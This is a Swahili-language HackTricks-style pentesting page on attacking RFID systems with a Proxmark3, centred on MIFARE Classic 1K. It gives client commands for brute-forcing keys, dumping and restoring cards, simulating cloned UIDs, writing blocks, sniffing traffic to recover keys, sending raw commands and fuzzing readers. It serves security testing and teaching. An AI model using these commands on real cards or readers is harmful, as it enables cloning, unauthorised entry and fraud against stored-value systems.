# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Kushambulia Mifumo ya RFID kwa Proxmark3

Sakinisha client ya Proxmark3 ya RRG/Iceman inayodumishwa kikamilifu pamoja na firmware inayolingana, kisha thibitisha sintaksia ya amri kwa build hiyo, kwa sababu amri za zamani zilizoonyeshwa hapa chini huenda zimebadilika.<sup>[[1]](#references)[[5]](#references)</sup>

### Kushambulia MIFARE Classic 1KB

MIFARE Classic 1K ina **sectors 16**, kila moja ikiwa na **blocks 4** za **bytes 16**. Block 0 ya mtengenezaji ina data ya UID/mtengenezaji na haiwezi kuandikwa upya kwenye kadi halisi za NXP; kadi maalum za clone au “magic” zinaweza kuruhusu kuandikwa upya.<sup>[[1]](#references)[[2]](#references)</sup>\
Ili kufikia kila sector unahitaji **keys 2** (**A** na **B**) ambazo zimehifadhiwa kwenye **block 3 ya kila sector** (sector trailer). Sector trailer pia huhifadhi **access bits** zinazopeana ruhusa za **kusoma na kuandika** kwenye **kila block** kwa kutumia keys hizo 2.\
Keys 2 zinafaa kutoa ruhusa ya kusoma ikiwa unajua key ya kwanza, na kuandika ikiwa unajua ya pili (kwa mfano).

Kuna mashambulizi kadhaa yanayoweza kutekelezwa

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 inaruhusu kufanya vitendo vingine kama **kusikiliza kwa siri** mawasiliano ya **Tag to Reader** ili kujaribu kupata data nyeti. Katika kadi hii, unaweza kunasa tu mawasiliano na kukokotoa key iliyotumika kwa sababu **operesheni za kriptografia zinazotumika ni dhaifu**, na ukijua plain text na cipher text unaweza kuikokotoa (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### Mtiririko wa haraka wa MiFare Classic kwa matumizi mabaya ya thamani iliyohifadhiwa

Kwa mfuatano wa kurejesha key, kulinganisha salio, kukagua integrity field, na ku-clone UID—ikiwemo transcript ya Proxmark3 client na vikwazo vya magic-card—tazama [MiFare Classic: kuchezea thamani iliyohifadhiwa offline](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1).

### Amri Ghafi

Mifumo ya IoT wakati mwingine hutumia **tag zisizo na chapa au zisizo za kibiashara**. Katika hali hii, unaweza kutumia Proxmark3 kutuma **amri ghafi maalum kwa tag**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Kwa kutumia maelezo haya, unaweza kujaribu kutafuta taarifa kuhusu kadi na jinsi ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri ghafi kama vile: `hf 14a raw -p -b 7 26`

### Scripts

Programu ya Proxmark3 huja na orodha iliyopakiwa awali ya **automation scripts** unazoweza kutumia kutekeleza kazi rahisi. Ili kupata orodha kamili, tumia amri ya `script list`. Kisha, tumia amri ya `script run` ikifuatiwa na jina la script:

```
proxmark3> script run mfkeys
```

Unaweza kuunda script ya **fuzz tag readers**: nakili data ya **valid card**, kisha andika tu **Lua script** ya kubadilisha kwa nasibu byte moja au zaidi na uangalie kama **reader** ita-crash katika iteration yoyote.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Taarifa ya NXP kuhusu MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Unyonyaji wa udhaifu wa kadi za NFC katika KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — usakinishaji wa Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
